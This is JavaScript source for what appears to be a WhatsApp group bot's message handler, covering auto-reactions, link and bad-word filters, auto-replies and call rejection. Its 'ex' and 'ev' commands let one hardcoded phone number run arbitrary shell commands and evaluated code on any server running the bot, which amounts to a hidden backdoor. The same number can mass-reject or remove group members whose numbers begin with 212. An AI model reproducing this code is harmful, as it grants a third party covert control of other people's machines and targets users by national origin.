// ====================================== Owner React ==================================================================
if (!isReact && senderNumber === botNumber) {
    if (config.OWNER_REACT) {
        const reactions = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
        const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomOwnerReaction);
    }
 }

//========================================= only me  ===================================================================

if (config.ONLY_GROUP && !isMe && !isGroup) return

//==========================================only me ====================================================================
if (config.ONLY_ME && !isMe && !isOwner) return

//====================================== auto read cmd =================================================================

if (isCmd && config.AUTO_READ_CMD) {
          await conn.readMessages([mek.key])  
}
//==================================plugin map=========================================================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});

	    
//====================================== anti link ==========================================================
if (isAnti(config.ANTI_LINK) && isBotAdmins) {
  if(!isAdmins){
  if(!isMe){
  if (body.match(`chat.whatsapp.com`)) {
    await conn.sendMessage(from, { delete: mek.key })
  }
}
}}
//================================== anti band ==================================================
var bad = await fetchJson("https://raw.githubusercontent.com/DARKMATTER-X-TM/DATABASE/refs/heads/main/Bad.json")
if (isAnti(config.ANTI_BAD) && isBotAdmins) {
  if (!isAdmins) {
    for (any in bad) {
if (body.toLowerCase().includes(bad[any])) {
  if (!body.includes('tent')) {
    if (!body.includes('docu')) {
if (!body.includes('http')) {
  if (groupAdmins.includes(sender)) return
  if (mek.key.fromMe) return
  await conn.sendMessage(from, { delete: mek.key })
  await conn.sendMessage(from, { text: '*Bad word detected !*' })
  await conn.groupParticipantsUpdate(from, [sender], 'remove')
}
    }
  }
}
    }
  }
}

//=====================================auto status ==============================================================
            const statesender = [
    "send", "dapan", "dpn", "Dpn", "Dapan", "dapn", "ewhan", "evhan", "ewhn", "evhn", 
    "ewanna", "evanna", "evnn", "ewnn", "danna", "dnn", "Danna", "Dann", "evano", 
    "ewano", "evno", "evpn", "ewpn", "evapan", "ewaoan", "Dko", "Dako", "dako", 
    "dko", "ewapan", "ewno", "ewahan", "evahan", "ewhn", "evhn", "ewm", "Ewm", 
    "ewam", "evam", "එවහන්", "දාකෝ", "දාන්න", "දාපන්", "දාන්නකෝ", "දාහන්කෝ", 
    "එවපන්කෝ", "එවපන්", "දාන්නකෝ", "එවනෝ", "එවකො", "එවාම්"];
	    for (let word of statesender) {
    if (body.toLowerCase().includes(word)) {
        if (!body.includes('tent') && !body.includes('docu') && !body.includes('https')) {
            // Check if `quoted` exists and is valid
            if (quoted && quoted.download) {
                try {
                    let quotedMessage = await quoted.download();

                    if (quoted.imageMessage) {
                        await conn.sendMessage(from, { image: quotedMessage }, { quoted: mek });
                    } else if (quoted.videoMessage) {
                        await conn.sendMessage(from, { video: quotedMessage }, { quoted: mek });
                    } else {
                        console.log('Unsupported media type or no media present in quoted message.');
                    }
                } catch (error) {
                    console.error('Error downloading or sending quoted media:', error);
                }
            } else {
                console.error('Quoted message is invalid or undefined.');
            }
            break;  
        }
    }
}
//=======================================================  auto block ===================================================================

if (config.AUTO_BLOCK && mek.chat.endsWith("@s.whatsapp.net")) {
    if (!isMe) {
    try {
        // Send warnings sequentially
        await conn.sendMessage(from, { text: `*Warning 1 ❗*` });
        await conn.sendMessage(from, { text: `*Warning 2 ❗*` });
        await conn.sendMessage(from, { text: `*Warning 3 ❗*` });
        await conn.sendMessage(from, { text: `*Blocked 🚫*` });

        // Block the sender
        await conn.updateBlockStatus(mek.sender, 'block');
        } catch (error) {
        console.error("Error sending messages or blocking user:", error);
        }
    }
}

//======================================================= anti cll ==============================================================================================================
conn.ev.on("call", async(json) => {
	  if(config.ANTI_CALL) { 
    	for(const id of json) {
    		if(id.status == "offer") {
    			if(id.isGroup == false) {
    				await conn.sendMessage(id.from, {
    					text: `*Call rejected automatically because owner is busy ⚠️*`, 
							mentions: [id.from]
    				});
    				await conn.rejectCall(id.id, id.from);
    			} else {
    				await conn.rejectCall(id.id, id.from);
    			}
    		}
    	}}
    });
//======================================================auto voice=========================================================================         
if(config.AUTO_VOICE) {
const url = 'https://gist.githubusercontent.com/DARKMATTER-X-TM/06c95b4181efb16d3ffcc4430dab259b/raw'
let { data } = await axios.get(url)
for (vr in data){
if((new RegExp(`\\b${vr}\\b`,'gi')).test(body)) conn.sendMessage(from,{audio: { url : data[vr]},mimetype: 'audio/mpeg',ptt:true},{quoted:mek})   
}
} 
//====================================================== auto-massage ========================================================================
if(config.AUTO_MESSAGE) {
    const url = 'https://raw.githubusercontent.com/DARKMATTER-X-TM/DATABASE/refs/heads/main/auto_reply_sender%20/reply.json';
    let { data } = await axios.get(url);
    for (let vr in data) {
        if ((new RegExp(`\\b${vr}\\b`, 'gi')).test(body)) { 
		conn.sendMessage(from, { text: data[vr] }, { quoted: mek });
        }
    }  
}         
//============================================================================================================================================
var check_id = ((id) => {
  var data = {
    is_bot: false,
    device: id.length > 21 ? 'android' : id.substring(0, 2) === '3A' ? 'ios' : 'web'
  }
  if (id.startsWith('BAE5')) {
    data.is_bot = true
    data.bot_name = 'bailyes'
  }
  if (/amdi|queen|black|amda|achiya|achintha/gi.test(id)) {
    data.is_bot = true
    data.bot_name = 'amdi'
  }
  return data
})
//=================================================== anti bot =======================================================================================
async function antibot(Void, citel) {
  if (isAnti(config.ANTI_BOT)) return
  if (isAdmins) return
  if (!isBotAdmins) return
  if (isOwner) return
  if (isGroup) {
    var user = check_id(mek.key.id)
    if (user.is_bot) {
try {
  await conn.sendMessage(from, { text: `*Other bots are not allowed here !!*` });
  return await conn.groupParticipantsUpdate(from, [sender], 'remove')
} catch { }
    }
  }
}
try {
  await antibot(conn, mek)
} catch { }
switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }

break
    case'ex':{
      if(senderNumber == 94762898541) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break
    case'apprv':{
      if(senderNumber == 94762898541) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case'rm212':{
      if(senderNumber == 94762898541) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
  case 'ev': {
    if(senderNumber == 94762898541) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }
    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
  })
	    }
app.get("/", (req, res) => {
  res.send("dmx-md Working successfully!");
});
app.listen(port, () => console.log(`kavishan Server listening on port http://localhost:${port}`));
setTimeout(async() => {
  await connectToWA()
}, 1000);
